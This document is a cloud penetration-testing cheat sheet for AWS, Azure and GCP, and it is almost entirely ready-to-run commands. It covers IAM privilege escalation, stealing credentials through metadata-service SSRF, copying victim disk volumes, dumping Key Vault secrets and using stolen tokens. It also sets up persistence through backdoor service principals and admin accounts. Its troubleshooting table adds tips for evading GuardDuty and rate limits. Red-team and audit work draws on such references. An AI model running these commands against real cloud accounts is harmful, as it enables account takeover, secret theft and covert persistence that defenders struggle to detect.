# Cloud Security & Penetration Testing Reference

## Tools

| Tool | Purpose |
|------|---------|
| ScoutSuite | Multi-cloud security auditing |
| Pacu | AWS exploitation framework |
| Prowler | AWS security auditing |
| AzureHound | Azure AD attack path mapping |
| ROADTools | Azure AD enumeration |
| MicroBurst | Azure security assessment |
| PowerZure | Azure post-exploitation |
| cloud_enum | Public resource discovery |

## AWS Penetration Testing

### Initial Enumeration

```bash
aws sts get-caller-identity
aws configure --profile compromised
aws iam list-access-keys

# Enumerate permissions
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### IAM Enumeration

```bash
aws iam list-users
aws iam list-groups-for-user --user-name TARGET_USER
aws iam list-attached-user-policies --user-name TARGET_USER
aws iam list-user-policies --user-name TARGET_USER
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### IAM Privilege Escalation

Shadow admin permissions (equivalent to administrator):

| Permission | Exploitation |
|------------|-------------|
| `iam:CreateAccessKey` | Create keys for admin user |
| `iam:CreateLoginProfile` | Set password for any user |
| `iam:AttachUserPolicy` | Attach admin policy to self |
| `iam:PutUserPolicy` | Add inline admin policy |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `lambda:UpdateFunctionCode` | Inject code into Lambda |

```bash
# Create access key for another user
aws iam create-access-key --user-name target_user

# Attach admin policy
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Lambda privilege escalation
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

### Metadata Service (SSRF)

```bash
# IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# IMDSv2 (token required)
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Fargate container credentials
# Check /proc/self/environ for AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
curl http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

### S3 Bucket Exploitation

```bash
aws s3 ls
aws s3 ls s3://bucket-name --recursive
aws s3 sync s3://bucket-name ./local-folder

# Public bucket search: https://buckets.grayhatwarfare.com/
```

### Lambda Exploitation

```bash
aws lambda list-functions
aws lambda get-function --function-name FUNCTION_NAME
aws lambda invoke --function-name FUNCTION_NAME output.txt

# Extract environment variables (may contain secrets)
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'
```

### SSM Command Execution

```bash
aws ssm describe-instance-information
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" --parameters commands="whoami"
aws ssm list-command-invocations --command-id "CMD-ID" --details \
  --query "CommandInvocations[].CommandPlugins[].Output"
```

### EC2 Volume Exploitation

```bash
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf
sudo mount /dev/xvdf1 /mnt/stolen
```

### AWS Persistence

```bash
aws iam create-access-key --user-name <username>
# Console access from API keys
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY
```

## Azure Penetration Testing

### Authentication

```powershell
Import-Module Az
Connect-AzAccount
$credential = Get-Credential
Connect-AzAccount -Credential $credential  # may bypass MFA

# Stolen token
Import-AzContext -Profile 'C:\Temp\StolenToken.json'
Save-AzContext -Path C:\Temp\AzureAccessToken.json
```

### Azure Enumeration

```powershell
Get-AzContext -ListAvailable
Get-AzSubscription && Get-AzRoleAssignment
Get-AzResource && Get-AzResourceGroup
Get-AzStorageAccount && Get-AzWebApp && Get-AzVM
Get-AzSQLServer

# Users and groups
Get-MsolUser -All && Get-MsolGroup -All
Get-MsolServicePrincipal

# Global Admins
Get-MsolRole -RoleName "Company Administrator"
```

### Azure Exploitation

```powershell
# Execute commands on VMs
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# Dump Key Vault secrets
az keyvault list --query '[].name' --output tsv
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>

# Extract VM UserData
$vms = Get-AzVM; $vms.UserData
```

### Azure Persistence

```powershell
# Create backdoor service principal
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner

# Add to Global Admin
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Create admin user
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### Azure Managed Identity Token
```powershell
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"}
```

## GCP Penetration Testing

### Authentication & Enumeration

```bash
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud config list && gcloud projects list
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>
```

### GCP Resource Enumeration

```bash
gcloud compute instances list
gcloud container clusters list
gsutil ls && gsutil ls -r gs://bucket-name
gcloud sql instances list
gcloud functions list
gcloud source repos list
```

### GCP Metadata Service

```bash
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'
```

### GCP Exploitation

```bash
# Decrypt with keyring
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global

# Find stored credentials
sudo find /home -name "credentials.db"
```

## Metadata Service URLs (All Providers)

| Provider | URL |
|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

## Cloud Security Quick Reference

### AWS Key Commands
| Action | Command |
|--------|---------|
| Caller identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List S3 buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Metadata | `curl http://169.254.169.254/latest/meta-data/` |

### Azure Key Commands
| Action | Command |
|--------|---------|
| Login | `Connect-AzAccount` |
| List users | `Get-MsolUser -All` |
| List VMs | `Get-AzVM` |
| Key Vault | `az keyvault secret list --vault-name <name>` |

### GCP Key Commands
| Action | Command |
|--------|---------|
| Login | `gcloud auth login` |
| List projects | `gcloud projects list` |
| List instances | `gcloud compute instances list` |
| List buckets | `gsutil ls` |

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Authentication failures | Verify credentials; check MFA; try alternative auth methods |
| Permission denied | List current roles; try different resources; check region |
| Metadata service blocked | Check IMDSv2 (AWS); verify instance role; check firewall |
| Rate limiting | Add delays; spread across regions; use multiple credentials |
| GuardDuty alerts (AWS) | Use Pacu with custom user-agent |
| Expired credentials | Re-fetch from metadata (temp creds rotate) |
